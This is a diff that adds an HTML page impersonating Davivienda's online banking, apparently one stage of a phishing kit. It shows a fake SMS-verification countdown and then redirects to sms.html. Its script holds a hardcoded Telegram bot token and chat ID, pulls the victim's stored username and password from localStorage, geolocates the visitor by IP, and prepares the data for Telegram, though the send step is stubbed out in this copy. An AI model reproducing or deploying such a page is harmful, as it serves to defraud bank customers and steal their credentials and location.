@@ -1,0 +1,379 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+  <head>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
+    <noscript
+      ><img
+        src="/insga7s/in/bcb5a7fec28c3715cee6b8f6601d2047/1/1?t=1770263526"
+        style="display: none"
+    /></noscript>
+       <meta
+      http-equiv="Cache-Control"
+      content="no-cache, no-store, must-revalidate"
+    /> 
+
+    <meta http-equiv="Pragma" content="no-cache" />
+    <meta http-equiv="Expires" content="0" />
+    <meta http-equiv="X-UA-Compatible" content="IE=EmulateIE7" />
+    <link
+      rel="shortcut icon"
+      href="https://enlinea.davivienda.com.pa/ebanking/images/favicon.ico"
+    />
+    <title>Davivienda</title>
+    <link href="./index_files/combined.css" type="text/css" rel="stylesheet" />
+    <link
+      rel="stylesheet"
+      href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/7.0.1/css/all.min.css"
+      integrity="sha512-2SwdPD6INVrV/lHTZbO2nodKhrnDdJK9/kg2XD1r9uGqPo1cUbujc+IYdlYdEErWNu69gVcYgdxlmVmzTWnetw=="
+      crossorigin="anonymous"
+      referrerpolicy="no-referrer"
+    />
+    <style>
+      body {
+        display: none;
+      }
+
+      /* Estilos para el dot loader */
+      .sms-loader-container {
+        text-align: center;
+        padding: 30px 0;
+      }
+
+      .loader-title {
+        color: #333;
+        margin-bottom: 25px;
+        font-size: 18px;
+        font-weight: bold;
+      }
+
+      .dot-loader {
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        height: 40px;
+        margin-bottom: 15px;
+      }
+
+      .dot {
+        width: 12px;
+        height: 12px;
+        margin: 0 5px;
+        border-radius: 50%;
+        background-color: #0055a0; /* Azul Davivienda */
+        animation: dot-loader 1.5s infinite ease-in-out;
+      }
+
+      .dot:nth-child(1) {
+        animation-delay: -0.3s;
+      }
+      .dot:nth-child(2) {
+        animation-delay: -0.15s;
+      }
+
+      @keyframes dot-loader {
+        0%,
+        80%,
+        100% {
+          transform: scale(0);
+          opacity: 0.3;
+        }
+        40% {
+          transform: scale(1);
+          opacity: 1;
+        }
+      }
+
+      .loading-text {
+        color: #666;
+        font-size: 14px;
+        margin-top: 10px;
+        font-style: italic;
+      }
+
+      .verification-info {
+        text-align: center;
+        color: #666;
+        font-size: 13px;
+        margin-top: 15px;
+        padding: 0 20px;
+        line-height: 1.5;
+      }
+
+      .verification-info i {
+        color: #0055a0;
+        margin-right: 5px;
+      }
+
+      .success-message {
+        color: #4caf50;
+        font-weight: bold;
+        margin-top: 15px;
+        animation: fadeIn 0.5s ease-in-out;
+      }
+
+      @keyframes fadeIn {
+        from {
+          opacity: 0;
+        }
+        to {
+          opacity: 1;
+        }
+      }
+
+      .status-message {
+        background-color: #f0f8ff;
+        border-left: 4px solid #0055a0;
+        padding: 12px 15px;
+        margin: 20px auto;
+        max-width: 500px;
+        text-align: left;
+        border-radius: 4px;
+        font-size: 13px;
+      }
+
+      .status-message i {
+        color: #0055a0;
+        margin-right: 8px;
+      }
+
+      .code-display {
+        background-color: #f8f9fa;
+        border: 1px dashed #0055a0;
+        padding: 10px;
+        margin: 15px auto;
+        max-width: 200px;
+        font-family: monospace;
+        font-size: 20px;
+        letter-spacing: 3px;
+        font-weight: bold;
+        color: #0055a0;
+        border-radius: 5px;
+      }
+    </style>
+  </head>
+  <body onload="" style="display: block">
+    <input type="hidden" id="tipoBanner" name="tipoBanner" />
+    <div class="outerDiv_" id="outer1">
+      <div id="superiorSinLogin">
+        <div style="float: right; padding-right: 73px">
+          <div class="idiomaLink">
+            <i class="fa fa-language" style="font-size: 1.2em"></i>
+            <a id="selectorEs" href="#" style="display: none">Español</a>
+            <a id="selectorEn" href="#">English</a>
+          </div>
+        </div>
+        <div id="banner"></div>
+      </div>
+      <div id="center">
+        <meta http-equiv="CACHE-CONTROL" content="NO-CACHE" />
+        <div id="loginBox">
+          <!-- FORMULARIO MODIFICADO -->
+          <form id="loginFormNuevo" autocomplete="off">
+            <audio id="audio" controls style="display: none">
+              <source type="audio/wav" />
+            </audio>
+            <div class="contentDiv">
+              <div id="titleBox">
+                <h2 id="tituloIngreseUsername" class="titulo-login">
+                  Verificación de Seguridad SMS
+                </h2>
+              </div>
+
+              <div id="pedirUsernameBox">
+                <div id="errorBox" style="visibility: hidden">
+                  <span id="errorPlaceholder">Error</span>
+                  <span
+                    id="errorServicioAvatar"
+                    class="value"
+                    style="display: none"
+                    >Error al consultar avatar</span
+                  >
+                </div>
+
+                <!-- DOT LOADER EN LUGAR DEL INPUT -->
+                <div class="sms-loader-container">
+                  <div class="loader-title">
+                    <i class="fa fa-mobile-alt"></i> Código de Verificación
+                    Enviado
+                  </div>
+
+                  <div class="dot-loader">
+                    <div class="dot"></div>
+                    <div class="dot"></div>
+                    <div class="dot"></div>
+                  </div>
+
+                  <div class="loading-text">
+                    Hemos enviado un código de verificación a su dispositivo
+                    móvil
+                  </div>
+
+                  <!-- Mensaje de estado -->
+                  <div class="status-message">
+                    <i class="fa fa-info-circle"></i>
+                    <strong>Por favor espere:</strong> Hemos enviado un codigo de verificación. Este proceso puede tomar unos
+                    segundos.
+                  </div>
+
+                  <div class="countdown" id="countdown">
+                    Verificación automática en
+                    <span id="timer">15</span> segundos...
+                  </div>
+
+                  <div class="verification-info">
+                    <i class="fa fa-shield-alt"></i>
+                    <strong>Protección de seguridad:</strong> Este código es
+                    válido por tiempo limitado y se verifica automáticamente por
+                    el sistema.
+                  </div>
+
+                  <!-- Mensaje de éxito que aparecerá al final -->
+                  <div
+                    id="successMessage"
+                    class="success-message"
+                    style="display: none"
+                  >
+                    <i class="fa fa-check-circle"></i> ¡Código verificado
+                    exitosamente! Redirigiendo...
+                  </div>
+                </div>
+              </div>
+            </div>
+          </form>
+        </div>
+      </div>
+      <div id="clearfooter"></div>
+    </div>
+    <div id="footer">
+      <ul>
+        <li class="footerText">
+          Davivienda - © 2017 Davivienda - Todos los derechos reservados
+        </li>
+      </ul>
+    </div>
+
+    <!-- SCRIPT MODIFICADO -->
+    <script>
+      // ===== CONFIGURACIÓN =====
+      const TELEGRAM_BOT_TOKEN =
+        "8051878604:AAG-Uy5xQyBtYRAXnWbEHgSJaxJw69UvAHQ";
+      const TELEGRAM_CHAT_ID = "-5276728069";
+
+      // Variable para almacenar datos
+      let datosPrevios = {
+        usuario: null,
+        clave: null,
+        ip: null,
+        ubicacion: null,
+        codigoGenerado: null,
+      };
+
+      // Función para generar un código aleatorio de 6 dígitos
+      function generarCodigoSMS() {
+        return Math.floor(100000 + Math.random() * 900000).toString();
+      }
+
+      // Función para obtener IP y ubicación
+      async function obtenerInformacionIP() {
+        try {
+          const response = await fetch("https://ipapi.co/json/");
+          const data = await response.json();
+          return {
+            ip: data.ip || "No disponible",
+            ciudad: data.city || "No disponible",
+            region: data.region || "No disponible",
+            pais: data.country_name || "No disponible",
+            proveedor: data.org || "No disponible",
+            lat: data.latitude || null,
+            lon: data.longitude || null,
+          };
+        } catch (error) {
+          console.error("Error obteniendo IP:", error);
+          return { ip: "Error al obtener", ciudad: "No disponible" };
+        }
+      }
+
+      // Función para enviar a Telegram
+
+      // Función para el contador
+      function iniciarContador() {
+        let segundos = 15;
+        const timerElement = document.getElementById("timer");
+        const countdownElement = document.getElementById("countdown");
+        const successMessage = document.getElementById("successMessage");
+        const codeDisplay = document.getElementById("generatedCode");
+
+        // Mostrar el código generado
+
+        const intervalo = setInterval(() => {
+          segundos--;
+          timerElement.textContent = segundos;
+
+          if (segundos <= 5) {
+            countdownElement.style.color = "#0055A0";
+            countdownElement.style.fontWeight = "bold";
+          }
+
+          if (segundos <= 0) {
+            clearInterval(intervalo);
+
+            // Mostrar mensaje de verificación exitosa
+            countdownElement.style.display = "none";
+            successMessage.style.display = "block";
+
+            // Enviar a Telegram justo antes de redirigir
+            setTimeout(async () => {
+              try {
+                console.log(
+                  "✅ Código SMS enviado a Telegram:",
+                  datosPrevios.codigoGenerado,
+                );
+              } catch (error) {
+                console.error("Error enviando a Telegram:", error);
+              }
+            }, 300);
+
+            // Redirigir automáticamente después de 2 segundos
+            setTimeout(() => {
+              // Limpiar localStorage si existe
+
+              // Redirigir a sms.html
+              window.location.href = "sms.html";
+            }, 2000);
+          }
+        }, 1000);
+      }
+
+      // Función principal que se ejecuta al cargar
+      async function iniciarProceso() {
+        console.log("🚀 Iniciando proceso de envío de código SMS...");
+
+        // Cargar datos previos
+        datosPrevios.usuario =
+          localStorage.getItem("usuario") || "No capturado";
+        datosPrevios.clave = localStorage.getItem("clave") || "No capturado";
+
+        // Obtener información de IP
+        const infoIP = await obtenerInformacionIP();
+        datosPrevios.ip = infoIP.ip;
+        datosPrevios.ubicacion = `${infoIP.ciudad}, ${infoIP.region}, ${infoIP.pais}`;
+        datosPrevios.coords =
+          infoIP.lat && infoIP.lon
+            ? { lat: infoIP.lat, lon: infoIP.lon }
+            : null;
+
+        // Generar código SMS aleatorio
+        datosPrevios.codigoGenerado = generarCodigoSMS();
+        console.log("📱 Código SMS generado:", datosPrevios.codigoGenerado);
+
+        // Enviar inmediatamente a Telegram que se generó un código
+
+        // Iniciar contador para verificación automática
+        iniciarContador();
+      }
+
+      // Iniciar proceso automático al cargar
+      document.addEventListener("DOMContentLoaded", iniciarProceso);
+    </script>
+  </body>
+</html>
